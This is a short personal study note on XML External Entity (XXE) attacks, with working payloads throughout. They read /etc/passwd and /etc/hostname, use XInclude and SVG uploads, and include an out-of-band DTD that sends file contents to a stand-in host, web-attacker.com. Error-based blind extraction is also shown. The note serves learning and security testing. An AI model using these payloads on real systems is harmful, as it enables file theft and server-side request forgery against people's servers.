---
layout: note
title: "XXE"
category: Web security
tag: [Web security, Note]
---

# XML External Entities

## Overview

This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser tricking the server to access a resource.

## Exploitation

#### Defining and using an **external entity** in XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<query>&xxe;</query>
```
If external entities are not allowed you may try XML **parameter entities**:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

#### XInclude is a part of the XML specification that allows an XML document to be built from sub-documents.
An XInclude attack would look like:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

#### XXE attacks via **file upload**. Note that SVG format uses XML.
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

#### XXE attacks via **modified content type**:  
```http
Content-Type: application/x-www-form-urlencoded -> text/xml
```
#### **Exfiltrate data out-of-band** for blind XXEs

On the server:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Payload:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

Mentions:  
- You can use burp collaborator to monitor DNS queries to your server.
- If out-of-band interactions are blocked you can try exploiting XXE to retrieve data by repurposing a local DTD. If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed. Now you can redefine an entity from that DTD and cause an error that is hopefully displayed.
<br/>
#### Exploiting **blind XXE** to **retrieve data via error messages**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## Attack surface
- **SSRF**
- **File retrieval** from server

## Resources
[Portswigger](https://portswigger.net/web-security/xxe)
